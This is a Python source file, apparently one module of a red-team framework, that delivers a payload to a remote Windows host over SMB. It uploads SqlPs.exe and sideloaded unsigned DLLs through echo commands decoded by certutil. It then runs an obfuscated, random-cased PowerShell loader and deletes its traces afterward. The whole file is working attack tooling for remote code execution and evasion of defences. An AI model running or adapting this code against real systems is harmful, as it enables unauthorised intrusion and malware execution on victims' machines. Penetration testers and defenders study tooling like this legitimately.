# -*- coding: UTF-8 -*-

import logging
import os
import sys
import time

from tqdm import tqdm

from framework import utils
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.helpers import ServiceHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "Service + echo + certutil.exe + SqlPs.exe + unsigned.dll (7+)"

    local_loader_path = None
    sqlps_exe = None
    sqlps_config = None
    cryptsp_dll = None
    version_dll = None

    tree = None
    sqlps_name = None

    uploaded_sqlps_exe = False
    uploaded_sqlps_config = False
    uploaded_cryptsp_dll = False
    uploaded_version_dll = False

    run_sqlps = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))

        self.local_loader_path = os.path.join(self.opts["data"], "loader", "powershell.ps1")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))
        self.sqlps_exe = os.path.join(self.opts["data"], "loader", "SqlPs", "SqlPs.exe")
        if not os.path.exists(self.sqlps_exe):
            raise Exception("{} does not existed".format(self.sqlps_exe))
        self.sqlps_config = os.path.join(self.opts["data"], "loader", "SqlPs", "SqlPs.exe.config")
        if not os.path.exists(self.sqlps_config):
            raise Exception("{} does not existed".format(self.sqlps_config))
        self.cryptsp_dll = os.path.join(self.opts["data"], "loader", "cryptsp.x64.dll")
        if not os.path.exists(self.cryptsp_dll):
            raise Exception("{} does not existed".format(self.cryptsp_dll))
        self.version_dll = os.path.join(self.opts["data"], "loader", "version.x86.dll")
        if not os.path.exists(self.version_dll):
            raise Exception("{} does not existed".format(self.version_dll))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = ServiceHelper(self.opts, self.smb_conn)
        self.helper.init()

    def upload_file_with_echo(self, local_path, output_path):
        temp_name = "{}.{}".format(utils.get_random_name(), utils.get_random_extension())
        temp_path = "{}\\{}".format(utils.get_random_location(), temp_name)
        echos = utils.file_to_echo_commands(local_path, temp_path)

        uploaded_temp = False
        uploaded_output = False

        try:
            progress_bar = None
            for command_echo in echos:
                self.helper.execute_command(command_echo)
                uploaded_temp = True
                time.sleep(0.2)
                if progress_bar is None:
                    logging.info("Uploading temp file: {}".format(temp_path))
                    progress_bar = tqdm(
                        total=len(echos), ncols=80, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} commands")
                progress_bar.update(1)
            progress_bar.close()

            logging.info("Decoding to file: {}".format(output_path))
            command_decode = utils.command_certutil_decode(temp_path, output_path)
            self.helper.execute_command(command_decode)
            uploaded_output = True

            command_delete = utils.command_delete_file(temp_path)
            self.helper.execute_command(command_delete)
            logging.info("Deleted: {}".format(temp_path))
            uploaded_temp = False
        except Exception:
            exc_info = sys.exc_info()
            if uploaded_temp:
                try:
                    command = utils.command_delete_file(temp_path)
                    logging.info("Deleted: {}".format(temp_path))
                    self.helper.execute_command(command)
                except Exception as e:
                    logging.error(e)
            if uploaded_output:
                try:
                    command = utils.command_delete_file(output_path)
                    logging.info("Deleted: {}".format(output_path))
                    self.helper.execute_command(command)
                except Exception as e:
                    logging.error(e)
            raise exc_info[0], exc_info[1], exc_info[2]

    def delivery_loader(self):
        self.tree = utils.get_random_location()
        self.sqlps_name = utils.get_random_name()

        self.upload_file_with_echo(self.sqlps_exe, "{0}\\{1}.exe".format(self.tree, self.sqlps_name))
        self.uploaded_sqlps_exe = True
        self.upload_file_with_echo(self.sqlps_config, "{0}\\{1}.exe.config".format(self.tree, self.sqlps_name))
        self.uploaded_sqlps_config = True
        self.upload_file_with_echo(self.version_dll, "{0}\\version.dll".format(self.tree))
        self.uploaded_version_dll = True
        self.upload_file_with_echo(self.cryptsp_dll, "{0}\\cryptsp.dll".format(self.tree))
        self.uploaded_cryptsp_dll = True

        command = "IF %PROCESSOR_ARCHITECTURE% == x86 (" \
                  "IF NOT DEFINED PROCESSOR_ARCHITEW6432 " \
                  "del /f /q \"{0}\\cryptsp.dll\")".format(self.tree)
        logging.info("Executing: {}".format(command))
        self.helper.execute_command(command)
        time.sleep(1)

        script = utils.obfuscate_powershell_script(self.opts, self.local_loader_path)
        script = script.replace("THIS_IS_PIKACHU", self.pipe_name)
        sqlps_path = "{0}\\{1}.exe".format(self.tree, self.sqlps_name)
        command = '{0} {1} "{2}"'.format(
            utils.random_case("start \"\" /b"),
            utils.random_case("\"{}\" -comma").format(sqlps_path), script)
        logging.info("Executing PowerShell payload")
        self.helper.execute_command(command)
        self.run_sqlps = True
        utils.sleep(20)

    def clean_up(self):
        if self.run_sqlps:
            try:
                command = "wmic process where \"name='{0}.exe' " \
                          "and commandline like '%{1}%'\" " \
                          "call terminate".format(self.sqlps_name,
                                                  self.pipe_name)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)

        if self.uploaded_version_dll:
            try:
                command = utils.command_delete_file("{0}\\version.dll".format(self.tree))
                self.helper.execute_command(command)
                logging.info("Deleted: {}".format("{0}\\version.dll".format(self.tree)))
            except Exception as e:
                logging.error(e)
        if self.uploaded_cryptsp_dll:
            try:
                command = utils.command_delete_file("{0}\\cryptsp.dll".format(self.tree))
                logging.info("Deleted: {}".format("{0}\\cryptsp.dll".format(self.tree)))
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)
        if self.uploaded_sqlps_config:
            try:
                command = utils.command_delete_file("{0}\\{1}.exe.config".format(self.tree, self.sqlps_name))
                logging.info("Deleted: {}".format("{0}\\{1}.exe.config".format(self.tree, self.sqlps_name)))
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)
        if self.uploaded_sqlps_exe:
            try:
                command = utils.command_delete_file("{0}\\{1}.exe".format(self.tree, self.sqlps_name))
                self.helper.execute_command(command)
                logging.info("Deleted: {}".format("{0}\\{1}.exe".format(self.tree, self.sqlps_name)))
            except Exception as e:
                logging.error(e)
        self.helper.clean_up()
